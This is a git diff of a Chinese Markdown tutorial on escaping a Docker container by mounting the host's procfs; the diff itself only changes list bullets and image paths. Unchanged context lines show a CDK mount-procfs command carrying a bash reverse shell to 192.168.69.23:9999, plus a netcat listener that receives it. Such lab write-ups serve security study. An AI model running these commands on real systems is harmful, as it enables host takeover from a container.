@@ -14,9 +14,9 @@ procfs 中的 `/proc/sys/kernel/core_pattern` 负责配置进程崩溃时内存�
 
 参考链接：
 
-- https://docs.docker.com/engine/security/userns-remap/
-- http://man7.org/linux/man-pages/man5/core.5.html
-- https://github.com/cdk-team/CDK
+* https://docs.docker.com/engine/security/userns-remap/
+* http://man7.org/linux/man-pages/man5/core.5.html
+* https://github.com/cdk-team/CDK
 
 ## 环境搭建
 
@@ -42,7 +42,7 @@ docker run -v /root/cdk:/cdk -v /proc:/host_proc --rm -it ubuntu bash
 # ./cdk run mount-procfs /host_proc "bash -c '/bin/bash -i >& /dev/tcp/192.168.69.23/9999 0>&1'"
 ```
 
-![](images/挂载宿主机%20procfs%20系统导致容器逃逸/image-20250520113929303.png)
+![](../.gitbook/assets/image-20250520113929303.png)
 
 成功接收：
 
@@ -50,4 +50,4 @@ docker run -v /root/cdk:/cdk -v /proc:/host_proc --rm -it ubuntu bash
 nc -vvl 9999
 ```
 
-![](images/挂载宿主机%20procfs%20系统导致容器逃逸/image-20250520113952809.png)
+![](../.gitbook/assets/image-20250520113952809.png)
